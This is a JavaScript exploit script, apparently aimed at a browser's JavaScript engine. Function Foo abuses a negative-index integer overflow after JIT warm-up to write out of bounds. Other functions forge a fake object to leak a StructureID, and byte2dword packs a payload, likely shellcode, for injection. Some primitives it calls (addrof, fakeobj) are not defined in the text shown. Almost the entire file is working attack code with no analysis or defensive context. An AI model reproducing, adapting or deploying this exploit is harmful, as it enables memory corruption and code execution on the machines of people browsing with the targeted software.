
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
const MAX_ITERATIONS = 0xc0000;

var BASE = 0x100000000;

function lower(x) {
    return x & 0xffffffff;
}
let lo = lower;

function higher(x) {
    return (x - (x % BASE)) / BASE;
}
let hi = higher;

let noCoW = 13.37;
let arr = [noCoW, 2.2, 3.3];
let oobArr = [noCoW, 2.2, 3.3];
let objArr = [{}, {}, {}];

function Foo(arr, n)
{
    n = n | 0;
    if(n<0) {
        let v = (-n) | 0;
        let idx = Math.abs(n);
        if(idx < arr.length) {
            if(idx & 0x80000000) {
                idx += -0x7ffffffd;  // idx = 3;
            }
            if(idx>0) {
                return arr[idx] = 1.04380972981885e-310;  // i2f(0x133700001337);
            }
        }
    }
}

function f2i(val)
{ 
    f64[0] = val;
    return u32[1] * 0x100000000 + u32[0];
}

function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}

function i2obj(val) {
    return i2f(val-0x02000000000000);
}

function LeakStructureID(obj) {
    let container = {
        cellHeader: i2obj(0x0108200700000000),
        butterfly: obj
    };
    let fakeObjAddr = Add(addrof(container), 0x10);
    let fakeObj = fakeobj(fakeObjAddr);
    f64[0] = fakeObj[0];
    let structureID = u32[0];
    u32[1] = 0x01082307 - 0x20000;
    container.cellHeader = f64[0];
    return structureID;
}

function byte2dword(payload) {
    let sc = []
    let tmp = 0;
    let len = Math.ceil(payload.length / 6)
    for (let i = 0; i < len; i += 1) {
        tmp = 0;
        pow = 1;
        for (let j = 0; j < 6; j++) {
            let c = payload[i * 6 + j]
            if (c === undefined) {
                c = 0;
            }
            pow = j == 0 ? 1 : 256 * pow;
            tmp += c * pow;
        }
        tmp += 0xc000000000000;
        sc.push(tmp);
    }
    return sc;
}

for(let i=0; i<MAX_ITERATIONS; i++) {
	let tmp = -2;
	Foo(arr, tmp);
}

Foo(arr, -2147483648);